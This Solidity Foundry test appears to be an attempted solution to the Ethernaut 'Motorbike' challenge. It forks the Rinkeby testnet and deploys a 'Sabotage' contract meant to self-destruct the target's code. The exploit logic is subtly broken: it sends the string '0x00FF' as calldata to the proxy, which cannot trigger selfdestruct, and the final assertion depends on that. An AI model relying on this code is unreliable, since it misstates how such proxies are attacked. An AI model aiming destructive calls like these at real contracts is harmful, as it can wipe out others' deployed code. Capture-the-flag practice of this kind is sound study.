// SPDX-License-Identifier: UNLICENSED
pragma solidity <0.7.0;

import "forge-std/Test.sol";
import "../src/Motorbike.sol";

contract SolutionTest is Test {
    uint rinkebyFork;
    string RINKEBY_RPC_URL = vm.envString("RINKEBY_RPC_URL");

    function setUp() public {
        rinkebyFork = vm.createFork(RINKEBY_RPC_URL);
    }

    function test() public {
        vm.selectFork(rinkebyFork);
        assertEq(vm.activeFork(), rinkebyFork);

        Motorbike instance = Motorbike(0x261D22266fF07389390A429b71efEaa7C649A108);
        Sabotage sabotage = new Sabotage(address(instance));

        sabotage.sugarInYourEngine();

        uint destruction = sabotage.inspectDamage();
        assertEq(destruction, 0);
    }
}

contract Sabotage {

    Motorbike instance;
    
    constructor(address payable $your_ethernaut_instance_here) public {
        instance = Motorbike($your_ethernaut_instance_here);
    }

    function sugarInYourEngine() public {
        // address(instance).call(abi.encodeWithSignature('selfdestruct(address)', address(this)));
        bytes memory selfDestruct = bytes("0x00FF");
        address(instance).call(abi.encode(selfDestruct));
    }

    function inspectDamage() public returns (uint) {
        uint256 size;
        address engine = address(instance);
        assembly {
            size := extcodesize(engine)
        }
        return size;
    }
}
